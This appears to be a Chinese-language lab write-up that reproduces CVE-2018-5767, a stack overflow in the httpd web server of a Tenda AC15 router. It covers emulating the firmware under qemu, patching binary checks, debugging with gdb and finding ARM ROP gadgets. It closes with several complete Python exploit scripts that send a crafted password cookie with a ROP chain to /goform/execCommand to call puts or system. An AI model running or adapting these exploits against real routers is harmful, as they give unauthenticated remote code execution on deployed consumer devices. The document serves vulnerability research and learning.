# 栈溢出cve-2018-5767(AC15)

# 1.详情

漏洞版本固件: V15.03.1.16

/bin/httpd中0x002DD44的位置, 使用函数 sscanf 直接将输入拷贝到栈上导致栈溢出发生

# 2.环境配置

## 1.patch程序

进入squashfs文件夹, 启动httpd

`cp /usr/bin/qemu-arm-static ./qemu`

 `sudo chroot . ./qemu bin/httpd`

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled.png)

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%201.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%201.png)

可以看到这两个判断, 似乎没啥用但是卡着不动, 使用ida pro配合keypatch进行patch这两个判断

首先是判断r3和0的大小, bgt为当r3大于0时跳转, 

```cpp
mov R3, R0改成
mov R3, #1
```

最后修改成这样

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%202.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%202.png)

然后可以跑下去了, 但是listen ip是错误的

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%203.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%203.png)

有个外部引入函数

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%204.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%204.png)

libcommon.so中又是一个外部引入的函数

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%205.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%205.png)

再找一下, 在lib/libChipApi.so中有定义, get_eth_name(0), 所以默认是连接br0

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%206.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%206.png)

结合main函数中

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%207.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%207.png)

默认连接到br0上

所以建立一个br0接口桥接到ens33, 供给其使用

或者是直接patch这个br0为'lo'或者是'ens33'

![Untitled](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%208.png)

## 2.配置网络

配置虚拟机网络

安装依赖文件

`sudo apt-get install bridge-utils uml-utilities`

修改 ubuntu主机网络配置，将ubuntu16主机系统中的网络接口配置文件 **/etc/network/interfaces** 修改为如下内容并保存、关闭。

```bash
auto lo
iface lo inet loopback

auto ens33
iface ens33 inet dhcp

#auto br0
iface br0 inet dhcp
  bridge_ports ens33
  bridge_maxwait 0
```

然后重启网络 `sudo /etc/init.d/networking restart`

如果没有出来就 sudo ifup 或者sudo ifdown 几下那个接口就出来了...

# 3.调试

使用qemu-user-static进行调试

在squashfile目录 `sudo chroot . ./qemu -g 12345 bin/httpd`

使用gdb-mulitarch配合**peda插件**开启, 

使用poc.py打到br0端口的ip地址

```python
import requests

ip  = "192.168.139.131"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"password="+"A"*501}
ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

使用gdb查看调用栈

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%209.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%209.png)

可以看到在0x2c5cc处发生了崩溃, c此处位strstr()函数

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2010.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2010.png)

sub_2C568()函数在R7WebsSecurityHandler()中被引用

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2011.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2011.png)

一共有3个地方进行了引用, 经过3次断点, 发现sub_2c568()是在第三个地方被引用的

## 1.溢出点

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2012.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2012.png)

## 2.修改poc

后续跟着一个判断, 重点就是如果".gif"存在直接跳过该函数. 并退出

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2013.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2013.png)

如果进入这里, 可能会打乱我们构造好的栈. 所以, 这里我们把poc的后续加上".gif", 不进入这里直接跳过. 

然后把poc改一下改成"a" * 500 + ".gif"

## 3.寻找gadget

我们需要控制一个r0寄存器传递"/bin/sh", 然后进行执行system, 

查找httpd中可以用的

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2014.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2014.png)

没啥可以用的gadget, 去lib/libc.so.0中找

ROPgadget --binary lib/libc.so.0 | grep "mov r0, sp"

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2015.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2015.png)

mov r0, sp; blx r3可以用

再找一条把system赋值到r3中的

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2016.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2016.png)

## 4.构造rop链

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2017.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2017.png)

gadget运行原理可以看之前的文章

# 4.exp.py

不过由于是qemu-user模式可能无法正常成功创建aaaa文件可以用这个exp.py验证输出hello world!!!!

```python
# python2
import requests
from pwn import *

context.binary = "squashfs-root/bin/httpd"
# context.log_level = "debug"
libc = ELF("squashfs-root/lib/libc.so.0")
puts_offset = libc.symbols["puts"]

libc_base_addr = 0xf65e5000
pop_r3_pc = libc_base_addr + 0x00018298
mov_r0_sp_blx_r3 = libc_base_addr + 0x00040cb8
puts_addr = libc_base_addr + puts_offset

ip  = "192.168.111.128"
url = "http://%s/goform/execCommand"%ip
# cookie = {"Cookir":"password="+cyclic(444) + ".gif" 
# + flat(libc_base_addr+pop_r3_pc, libc_base_addr+system_offset, libc_base_addr+mov_r0_sp_blx_r3)+ "touch ./abcd" }

cookie = {"Cookir":"password="+cyclic(444) + ".gif" 
+ flat(pop_r3_pc, puts_addr, mov_r0_sp_blx_r3)+ "hello world!!!!!" }

ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

或者是python3

需要把pwntools生成的payload使用'LATIN1'进行encoding

```python
# python3
import requests
from pwn import *

context.binary = "bin/httpd"
# context.log_level = "debug"
libc = ELF("lib/libc.so.0")
puts_offset = libc.symbols["puts"]

libc_base_addr = 0xf65e5000
pop_r3_pc = libc_base_addr + 0x00018298
mov_r0_sp_blx_r3 = libc_base_addr + 0x00040cb8
puts_addr = libc_base_addr + puts_offset

ip  = "192.168.129.131"
url = "http://%s/goform/execCommand"%ip
# cookie = {"Cookir":"password="+cyclic(444) + ".gif" 
# + flat(libc_base_addr+pop_r3_pc, libc_base_addr+system_offset, libc_base_addr+mov_r0_sp_blx_r3)+ "touch ./abcd" }

#print(type(cyclic(400)))
#print(type(flat(pop_r3_pc, puts_addr, mov_r0_sp_blx_r3)))

cookie = {"Cookir":"password="+str(cyclic(444), encoding='LATIN1') + ".gif"\
+ str(flat(pop_r3_pc, puts_addr, mov_r0_sp_blx_r3), encoding='LATIN1')+ "hello world!!!!!" }

ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

在qemu运行界面可以看到, 说明rce成功

![%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2018.png](%E6%A0%88%E6%BA%A2%E5%87%BAcve-2018-5767(AC15)/Untitled%2018.png)

以及一个调用system的exp

```python
import requests
from pwn import *
context.binary = "squashfs-root/bin/httpd"
# context. log_level = "debug"

libc = ELF( "squashfs-root/lib/libc.so.0")
system_offset = libc.symbols["system"]
libc_base_addr = 0xf65e5000
pop_r3_pc = libc_base_addr + 0x00018298
mov_r0_sp_blx_r3 = libc_base_addr +0x00040cb8
system_addr = libc_base_addr +system_offset

ip  = "192.168.129.131"
url = "http://%s/goform/execCommand"%ip
cookie ={"Cookir":"password="+cyclic(444)+".gif"+flat(pop_r3_pc,system_addr,mov_r0_sp_blx_r3)+ "touch aaaa"}

ret = requests.get(url=url ,cookies=cookie)
print(ret.text)
```